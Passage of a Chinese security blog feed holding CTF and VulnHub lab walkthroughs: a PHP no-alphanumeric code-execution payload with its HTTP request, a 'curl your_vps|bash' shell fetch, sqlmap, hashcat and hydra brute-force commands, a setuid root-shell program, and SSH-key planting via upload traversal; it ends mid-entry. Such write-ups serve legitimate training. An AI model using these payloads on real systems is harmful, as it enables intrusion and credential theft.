<code>phpinfo</code>得到执行 执行任意代码,比如 <code>system('id')</code> <a href="/images/2018/10/2018-10-09-19-12-07屏幕截图.png"><img src="/images/2018/10/2018-10-09-19-12-07屏幕截图-300x140.png" /></a> 如果想要反弹shell可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl your_vpsbash</span><br></pre></td></tr></table></figure><p>反正我的并没有超字符限制...</p><h2 id="php5">php5</h2><p>php5就不一样了,如果同样用php7执行phpinfo的方法会有语法错误,因为php5并不能<code>($a)();</code>执行函数 <a href="/images/2018/10/2018-10-09-19-39-10屏幕截图.png"><img src="/images/2018/10/2018-10-09-19-39-10屏幕截图-300x91.png" /></a> 那么怎么利用呢,我们可以用到linux下的几个知识点</p><blockquote><p>shell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替,比如 *可以代替0个及以上任意字符 ?可以代表1个任意字符</p></blockquote><p>而且用.来执行命令是不需要x的权限的,那么只要服务器有我们的文件,我们就可以用.去执行 而为了避免字母我们可以用?代替,比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp# ls</span><br><span class="line">phpyhwwPd</span><br><span class="line">root@1811de971fc8:/tmp# . /???/php??????</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@1811de971fc8:/tmp#</span><br></pre></td></tr></table></figure><p>但是如果列出所有的<code>/???/?????????</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp<span class="comment"># ls /???/?????????</span></span><br><span class="line">/bin/run-parts  /etc/host.conf  /etc/issue.net  /etc/localtime  /etc/securetty  /tmp/phpyhwwPd</span><br><span class="line"></span><br><span class="line">/etc/profile.d:</span><br><span class="line">root@1811de971fc8:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>其实还有其他的文件,那我们怎么获得需要的/tmp下面的临时文件呢? linux的文档里面有写<a href="http://man7.org/linux/man-pages/man7/glob.7.html" title="http://man7.org/linux/man-pages/man7/glob.7.html">http://man7.org/linux/man-pages/man7/glob.7.html</a> 我们可以用<code>[^.]</code>排除点,同理可以排除-</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp<span class="comment"># ls /???/???[^-][^.][^.]???</span></span><br><span class="line">/etc/localtime  /etc/securetty  /tmp/phpyhwwPd</span><br><span class="line"></span><br><span class="line">/etc/profile.d:</span><br><span class="line">root@1811de971fc8:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>这个时候还有两个干扰文件,想到临时文件中可能有大写字母,而大写字母都在<code>@</code>和<code>[</code>中间,那么可以用<code>[@-[]</code>表示大写字母</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp<span class="comment"># . /???/???[^-][^.][^.]?[@-[]?</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@1811de971fc8:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>最后带上一个php执行shell的小trick</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&lt;?=`ls`;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以发现其实是有回显的命令执行 一叶飘零博客也写到过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="variable">$flag</span>=<span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么最后payload为<code>?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;</code> 记得<code>urlencode</code>一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?code=%3F%3E%3C%3F%3D%60.+%2F%3F%3F%3F%2F%3F%3F%3F%3F%3F%3F%3F%5B%40-%5B%5D%3F%60%3B%3F%3E</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:9091</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>169</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3sBjBSfSNZn70MBF</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-applescript"><span class="comment">------WebKitFormBoundary3sBjBSfSNZn70MBF</span></span></span><br><span class="line"><span class="language-applescript">Content-Disposition: form-data; <span class="built_in">name</span>=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.sh&quot;</span></span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript"><span class="comment"># !/bin/bash</span></span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript"><span class="built_in">id</span></span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript"><span class="comment">------WebKitFormBoundary3sBjBSfSNZn70MBF--</span></span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-09-21-59-46屏幕截图.png"><img src="/images/2018/10/2018-10-09-21-59-46屏幕截图-300x153.png" /></a> 参考文章:<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" title="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a> <a href="http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/" title="http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/">http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/</a></p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透(pinky&#39;s palace)</title>
      <link href="/2018/10/07/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fpinkys-palace/"/>
      <url>/2018/10/07/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fpinkys-palace/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><p><a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/" title="https://www.vulnhub.com/entry/pinkys-palace-v1,225/">https://www.vulnhub.com/entry/pinkys-palace-v1,225/</a></p><h2 id="靶机ip和端口">靶机ip和端口</h2><p>ip:192.168.1.103 端口信息 <a href="/images/2018/10/2018-10-06-12-23-28屏幕截图.png"><img src="/images/2018/10/2018-10-06-12-23-28屏幕截图-300x130.png" /></a></p><h2 id="代理访问">代理访问</h2><p>直接访问8080端口被403了,看到他有个31337端口的代理,curl挂代理访问一下 <a href="/images/2018/10/2018-10-06-12-29-04屏幕截图.png"><img src="/images/2018/10/2018-10-06-12-29-04屏幕截图-300x155.png" /></a> 发现ok,给firefox挂个代理去直接访问 <a href="/images/2018/10/2018-10-06-12-31-04屏幕截图.png"><img src="/images/2018/10/2018-10-06-12-31-04屏幕截图-300x130.png" /></a> 发现没东西,dirbuster扫一下,设置dirbuster的小字典 <a href="/images/2018/10/2018-10-06-12-40-31屏幕截图.png"><img src="/images/2018/10/2018-10-06-12-40-31屏幕截图-300x156.png" /></a> 去访问一下 发现是个登录页面,admin/admin一下 <a href="/images/2018/10/2018-10-06-12-42-35屏幕截图.png"><img src="/images/2018/10/2018-10-06-12-42-35屏幕截图-300x196.png" /></a> 登录错误,看下源码 <a href="/images/2018/10/2018-10-06-12-42-11屏幕截图.png"><img src="/images/2018/10/2018-10-06-12-42-11屏幕截图-300x152.png" /></a> 在去看下log,发现有我们的记录 <a href="/images/2018/10/2018-10-06-12-43-31屏幕截图.png"><img src="/images/2018/10/2018-10-06-12-43-31屏幕截图-300x65.png" /></a> username和password都试了一下注入,都没成功,试了下ua,发现成功注入,本来想写脚本,但是嫌麻烦,直接sqlmap了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --proxy <span class="string">&quot;http://192.168.1.103:31337&quot;</span> -r req.http --level=5 --risk=3 -D pinky_sec_db -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-06-12-49-47屏幕截图.png"><img src="/images/2018/10/2018-10-06-12-49-47屏幕截图-300x74.png" /></a> 然后第一个hash解不出来...第二个cmd5付费查询...我选择writeup学习法... hashcat直接用rockyou跑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 d60dffed7cc0d87e1f4a11aa06ca73af /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure><p>拿到明文:3pinkysaf33pinkysaf3 但是登录还是密码错误,试试ssh <a href="/images/2018/10/2018-10-06-13-04-23屏幕截图.png"><img src="/images/2018/10/2018-10-06-13-04-23屏幕截图-300x149.png" /></a></p><h2 id="提权">提权</h2><p>找了一下用户目录,并没有发现什么,去web目录发现有个奇怪的文件夹,他说存了rsa的密钥 <a href="/images/2018/10/2018-10-06-14-33-58屏幕截图.png"><img src="/images/2018/10/2018-10-06-14-33-58屏幕截图-300x137.png" /></a> 解密一下登录 <a href="/images/2018/10/2018-10-06-14-35-29屏幕截图.png"><img src="/images/2018/10/2018-10-06-14-35-29屏幕截图-300x101.png" /></a> 看下能不能suid提权 <a href="/images/2018/10/2018-10-06-14-36-34屏幕截图.png"><img src="/images/2018/10/2018-10-06-14-36-34屏幕截图-300x239.png" /></a> 再看下note</p><blockquote><p>Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(</p></blockquote><p>发现要去pwn掉这个adminhelper.... 把程序scp传一下然后ida <a href="/images/2018/10/2018-10-07-16-36-42屏幕截图.png"><img src="/images/2018/10/2018-10-07-16-36-42屏幕截图-300x221.png" /></a> 看一下dest <a href="/images/2018/10/2018-10-07-16-36-32屏幕截图.png"><img src="/images/2018/10/2018-10-07-16-36-32屏幕截图-300x166.png" /></a> 覆盖4*16+8之后到返回地址 <a href="/images/2018/10/2018-10-07-16-38-36屏幕截图.png"><img src="/images/2018/10/2018-10-07-16-38-36屏幕截图-300x131.png" /></a> check一下aslr</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@pinkys-palace:/home/pinky<span class="comment"># cat /proc/sys/kernel/randomize_va_space                                                              </span></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>并没有开 然后里面有个spawn函数,可以拿root,到gdb看下地址 <a href="/images/2018/10/2018-10-07-16-41-01屏幕截图.png"><img src="/images/2018/10/2018-10-07-16-41-01屏幕截图-300x129.png" /></a> 直接去跳一下 <a href="/images/2018/10/2018-10-07-16-44-10屏幕截图.png"><img src="/images/2018/10/2018-10-07-16-44-10屏幕截图-300x112.png" /></a> 当然,uid和gid并不是root,完全提权的话用一个简单的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">execvp(<span class="string">&quot;/bin/bash&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后gcc编译执行 <a href="/images/2018/10/2018-10-07-16-46-00屏幕截图.png"><img src="/images/2018/10/2018-10-07-16-46-00屏幕截图-300x140.png" /></a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透(blackmarket)</title>
      <link href="/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/"/>
      <url>/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><p><a href="https://www.vulnhub.com/entry/blackmarket-1,223/" title="https://www.vulnhub.com/entry/blackmarket-1,223/">https://www.vulnhub.com/entry/blackmarket-1,223/</a> 然后靶机描述说有6个flag,每个flag都有hint... 个人感觉脑洞有点大...看的wp做的..</p><h2 id="ip端口">ip端口</h2><p>ip:192.168.1.106 端口 <a href="/images/2018/10/2018-10-06-15-46-30屏幕截图.png"><img src="/images/2018/10/2018-10-06-15-46-30屏幕截图.png" /></a></p><h2 id="flag1">flag1</h2><p>去80端口 源码拿到flag1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag1&#123;Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=&#125;</span><br></pre></td></tr></table></figure><p>base解一下得到<code>CIA - Operation Treadstone</code> 搜了一下,发现是个电影....猜测要去找用户名爆破...懒得找了直接看wp了.... wp用的crew获取密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w cewl.txt http://bourne.wikia.com/wiki/Operation_Treadstone</span><br></pre></td></tr></table></figure><p>然后hydra爆破,不过爆破的是ftp,后面再说</p><h2 id="flag3">flag3</h2><p>回到80端口dirb一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.1.106/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/admin/                                                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/css/                                                                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/db/                                                                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/dist/                                                                                            </span><br><span class="line">+ http://192.168.1.106/index.php (CODE:200SIZE:2433)                                                                                </span><br><span class="line">+ http://192.168.1.106/server-status (CODE:403SIZE:293)                                                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/squirrelmail/                                                                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/supplier/                                                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/upload/                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/user/                                                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/vendor/ </span><br></pre></td></tr></table></figure><p>登录页面hydra爆破一下,wp直接username就放三个用户名:user,supplier,admin....反正我不知道为什么想到这个...</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:~$ hydra -L username.txt -P /home/blacsheep/Tools/WebSecurity/dict/passwords/common/Top196-probable.txt -e nsr -t 64 192.168.1.106 http-post-form <span class="string">&quot;/login.php:username=^USER^&amp;password=^PASS^:failed&quot;</span></span><br><span class="line">Hydra v8.6 (c) 2017 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-06 16:44:39</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 597 login tries (l:3/p:199), ~10 tries per task</span><br><span class="line">[DATA] attacking http-post-form://192.168.1.106:80//login.php:username=^USER^&amp;password=^PASS^:failed</span><br><span class="line">[80][http-post-form] host: 192.168.1.106   login: supplier   password: supplier</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) finished at 2018-10-06 16:44:51</span><br></pre></td></tr></table></figure><p>拿到密码:supplier/supplier 登录上去 <a href="/images/2018/10/2018-10-06-16-48-29屏幕截图.png"><img src="/images/2018/10/2018-10-06-16-48-29屏幕截图.png" /></a> 随手一测一个注入... <a href="/images/2018/10/2018-10-06-16-51-09屏幕截图.png"><img src="/images/2018/10/2018-10-06-16-51-09屏幕截图.png" /></a> sqlmap跑一下,真的跑的很慢...</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.106/supplier/edit_product.php?id=16&quot; --cookie=&quot;PHPSESSID=ddqpnve2g6ptetfu39b5kdoj24&quot; -o -D BlackMarket -T flag --dump</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-06-19-10-26屏幕截图.png"><img src="/images/2018/10/2018-10-06-19-10-26屏幕截图.png" /></a> 脱库太慢了,直接用别人的图了 <a href="/images/2018/10/0.7d9nzmb276f.png"><img src="/images/2018/10/0.7d9nzmb276f.png" /></a> <a href="/images/2018/10/0.dlp3yrthkfj.png"><img src="/images/2018/10/0.dlp3yrthkfj.png" /></a></p><h2 id="flag2">flag2</h2><p>发现注入可以读取文件,读/etc/passwd发现ftp用户nicky</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">dimitri:x:1000:1000:,,,:/home/dimitri:/bin/bash</span><br><span class="line">jbourne:x:1001:1001::/var/www/html/jbourne:</span><br><span class="line">nicky:x:1002:1002:,,,:/home/nicky:/bin/ftponly</span><br><span class="line">ftp:x:112:120:ftp daemon,,,:/srv/ftp:/bin/false</span><br></pre></td></tr></table></figure><p>hydra爆一下 <a href="/images/2018/10/2018-10-06-19-19-51屏幕截图.png"><img src="/images/2018/10/2018-10-06-19-19-51屏幕截图.png" /></a> 登录进去发现文件下下来 <a href="/images/2018/10/2018-10-06-19-22-05屏幕截图.png"><img src="/images/2018/10/2018-10-06-19-22-05屏幕截图.png" /></a></p><blockquote><p>flag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy} If anyone reading this message it means you are on the right track however I do not have any idea about the CIA blackmarket Vehical workshop. You must find out and hack it!</p></blockquote><p>flag2的hint:Congrats Proceed Further</p><h2 id="flag4">flag4</h2><p>admin界面有用户管理,修改密码处存在漏洞,可以指定用户修改,改掉id=1的用户 <a href="/images/2018/10/2018-10-06-19-37-29屏幕截图.png"><img src="/images/2018/10/2018-10-06-19-37-29屏幕截图.png" /></a> 登录直接拿到flag <a href="/images/2018/10/2018-10-06-19-38-51屏幕截图.png"><img src="/images/2018/10/2018-10-06-19-38-51屏幕截图.png" /></a> 解一下,nothing is here</p><h2 id="flag5">flag5</h2><p>根据上条hint,登录一下邮箱(jbourne:?????) <a href="/images/2018/10/2018-10-06-20-01-23屏幕截图.png"><img src="/images/2018/10/2018-10-06-20-01-23屏幕截图.png" /></a> 拿到信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Flag5&#123;RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ=&#125;</span><br><span class="line"></span><br><span class="line">HELLO Friend,</span><br><span class="line"></span><br><span class="line">I have intercept the message from Russian&#x27;s some how we are working on the same</span><br><span class="line">direction, however, I couldn&#x27;t able to decode the message. </span><br><span class="line"></span><br><span class="line">&lt;Message Begins&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Sr Wrnrgir</span><br><span class="line">Ru blf ziv ivzwrmt gsrh R nrtsg yv mlg zorev. R szev kozxv z yzxpwlli rm Yozxpnzipvg</span><br><span class="line">dliphslk fmwvi /ptyyzxpwlli ulowvi blf nfhg szev gl fhv</span><br><span class="line">KzhhKzhh.qkt rm liwvi gl tvg zxxvhh.</span><br><span class="line"></span><br><span class="line">&lt;/end&gt;</span><br></pre></td></tr></table></figure><p><a href="https://quipqiup.com/" title="https://quipqiup.com/">https://quipqiup.com/</a>解密拿到信息Everything is encrypted 试了一下凯撒,发现并不是,试了一个替换密码多给几个线索拿到明文</p><blockquote><p>Hi Dimitri If you are reading this I might be not alive. I have place a backdoor in Blackmarket workshop under /kgbbackdoor folder you must have to use PassPass.jpg in order to get access</p></blockquote><h2 id="flag6">flag6</h2><p>这一步又很脑洞了... 访问workshop发现404 试了一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> &#123;a..z&#125;; <span class="keyword">do</span> <span class="built_in">printf</span> <span class="string">&quot;/<span class="variable">$&#123;c&#125;</span>workshop/:%d\n&quot;</span> $(curl -s -w %&#123;http_code&#125; -o /dev/null 192.168.1.106/<span class="variable">$&#123;c&#125;</span>workshop/); <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-06-20-23-13屏幕截图.png"><img src="/images/2018/10/2018-10-06-20-23-13屏幕截图.png" /></a> 发现vworkshop为200,按前面的目录进去看下 <a href="/images/2018/10/2018-10-06-20-24-22屏幕截图.png"><img src="/images/2018/10/2018-10-06-20-24-22屏幕截图.png" /></a> strings一下拿到密码 <a href="/images/2018/10/2018-10-06-20-26-09屏幕截图.png"><img src="/images/2018/10/2018-10-06-20-26-09屏幕截图.png" /></a> 解一下,拿到真实密码<code>HailKGB</code> <a href="/images/2018/10/2018-10-06-20-27-23屏幕截图.png"><img src="/images/2018/10/2018-10-06-20-27-23屏幕截图.png" /></a> 访问backdoor.php,发现404,但是页面不一样 <a href="/images/2018/10/2018-10-06-20-29-44屏幕截图.png"><img src="/images/2018/10/2018-10-06-20-29-44屏幕截图.png" /></a> 发现其实有密码,post一下发现确实是后门 <a href="/images/2018/10/2018-10-06-20-32-52屏幕截图.png"><img src="/images/2018/10/2018-10-06-20-32-52屏幕截图.png" /></a> 拿到flag6 flag6{Um9vdCB0aW1l} 解一下:Root time</p><h2 id="提权">提权</h2><p>直接上脏牛 root密码变成了dirtyCowFun 登录上去拿到最后的flag <a href="/images/2018/10/2018-10-06-21-17-07屏幕截图.png"><img src="/images/2018/10/2018-10-06-21-17-07屏幕截图.png" /></a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透(trollcave)</title>
      <link href="/2018/10/04/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftrollcave/"/>
      <url>/2018/10/04/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftrollcave/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><p><a href="https://www.vulnhub.com/entry/trollcave-12,230/" title="https://www.vulnhub.com/entry/trollcave-12,230/">https://www.vulnhub.com/entry/trollcave-12,230/</a> 第一次打到ruby的站...几乎完全不会..简单记录下吧</p><h2 id="ip和端口">ip和端口</h2><p>靶机ip:192.168.1.101 端口情况 <a href="/images/2018/10/2018-10-04-17-16-01屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-16-01屏幕截图-300x135.png" /></a></p><h2 id="web站点踩点">web站点踩点</h2><p>进去发现就是个普通的站点 <a href="/images/2018/10/2018-10-04-17-16-59屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-16-59屏幕截图-300x200.png" /></a> 注册功能关闭了,也没啥功能,dirb扫一下 <a href="/images/2018/10/2018-10-04-17-19-06屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-19-06屏幕截图-300x191.png" /></a> 进去一看发现并没有什么用,都需要登录... 注意到文章 <a href="/images/2018/10/2018-10-04-17-19-55屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-19-55屏幕截图-300x300.png" /></a> 然而去访问并没有东西 <a href="/images/2018/10/2018-10-04-17-20-36屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-20-36屏幕截图-300x150.png" /></a> 尝试用各种admin的名字去用hydra爆破ssh,但是失败了 看了wp才知道ruby的resetpassword,参考ruby on rails的教程 <a href="https://www.railstutorial.org/book/password_reset#sec-password_resets_resource" title="https://www.railstutorial.org/book/password_reset#sec-password_resets_resource">https://www.railstutorial.org/book/password_reset#sec-password_resets_resource</a> <a href="/images/2018/10/2018-10-04-17-25-38屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-25-38屏幕截图-300x126.png" /></a> 那么去访问一下 <a href="/images/2018/10/2018-10-04-17-26-32屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-26-32屏幕截图-300x174.png" /></a> 发现重置密码页面,然而并不能重置superadmin的密码,尝试重置普通用户的密码 <a href="/images/2018/10/2018-10-04-17-29-21屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-29-21屏幕截图-300x234.png" /></a> 发现后面有个name参数,我们改成King,再去重置 <a href="/images/2018/10/2018-10-04-17-37-01屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-37-01屏幕截图-300x252.png" /></a> 成功进入管理页面 <a href="/images/2018/10/2018-10-04-17-38-02屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-38-02屏幕截图-300x160.png" /></a></p><h2 id="getshell">getshell</h2><p>进去之后发现有个文件上传的页面,但是因为admin关闭并不能使用,我们去打开一下 <a href="/images/2018/10/2018-10-04-17-38-58屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-38-58屏幕截图-300x265.png" /></a> 要是php到这里其实就很简单了,直接上传一句话就结束了,但是ruby并不是的...这里是用传ssh密钥的方式..传文件可以目录穿越,但是我们怎么知道往哪传呢?登录之后我们可以看到更多文章,比如 <a href="/images/2018/10/2018-10-04-17-47-22屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-47-22屏幕截图-300x248.png" /></a> 发现存在rails用户和coderguys用户,其实还有很多,但是尝试之后发现只有rails的用户目录有.ssh,那么写入ssh密钥,拿到shell <a href="/images/2018/10/2018-10-04-17-52-13屏幕截图.png"><img src="/images/2018/10/2018-10-04-17-52-13屏幕截图-300x220.png" /></a> 登录 <a href="/images/2018/10/2018-10-04-18-00-51屏幕截图.png"><img 